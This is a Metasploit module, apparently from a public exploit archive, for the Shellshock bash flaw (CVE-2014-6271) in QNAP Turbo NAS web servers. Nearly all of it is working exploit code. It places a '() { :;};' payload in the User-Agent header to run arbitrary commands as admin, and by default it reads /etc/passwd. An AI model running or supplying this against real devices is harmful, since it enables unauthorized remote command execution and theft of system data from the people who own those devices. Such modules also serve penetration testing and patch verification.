# Date: 7 February 2015
# Exploit Author: Patrick Pellegrino | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
# Employer homepage: http://www.securegroup.it
# Vendor homepage: http://www.qnap.com
# Version: All Turbo NAS models except TS-100, TS-101, TS-200
# Tested on: TS-1279U-RP
# CVE : 2014-6271
# Vendor URL bulletin : http://www.qnap.com/i/it/support/con_show.php?cid=61
 
 
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/d3vpp/metasploit-modules
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;QNAP Web server remote code execution via Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039; => %q{
        This module allows you to inject unix command with the same user who runs the http service - admin - directly on the QNAP system.
        Affected products:
        All Turbo NAS models except TS-100, TS-101, TS-200
        },
      &#039;Author&#039; => [&#039;Patrick Pellegrino&#039;], # Metasploit module | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
            [&#039;CVE&#039;, &#039;2014-6271&#039;], #aka ShellShock
            [&#039;URL&#039;, &#039;http://www.qnap.com/i/it/support/con_show.php?cid=61&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;]
    ))
 
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to CGI script&#039;,&#039;/cgi-bin/index.cgi&#039;]),
      OptString.new(&#039;CMD&#039;, [ true, &#039;The command to run&#039;, &#039;/bin/cat  /etc/passwd&#039;])
    ], self.class)
  end
 
 def check
    begin
    res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path),
        &#039;agent&#039; => "() { :;}; echo; /usr/bin/id"
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
        vprint_error("Connection failed")
        return Exploit::CheckCode::Unknown
 end
     
    if !res
      return Exploit::CheckCode::Unknown
    elsif res.code== 302 and res.body.include? &#039;uid&#039;
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
     
 
  def run
 
    res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path),
        &#039;agent&#039; => "() { :;}; echo; #{datastore[&#039;CMD&#039;]}"
      })
     
    if res.body.empty?
        print_error("No data found.")
    elsif res.code== 302
        print_status("#{rhost}:#{rport} - bash env variable injected")
        puts " "
        print_line(res.body)
    end
    end
     
end

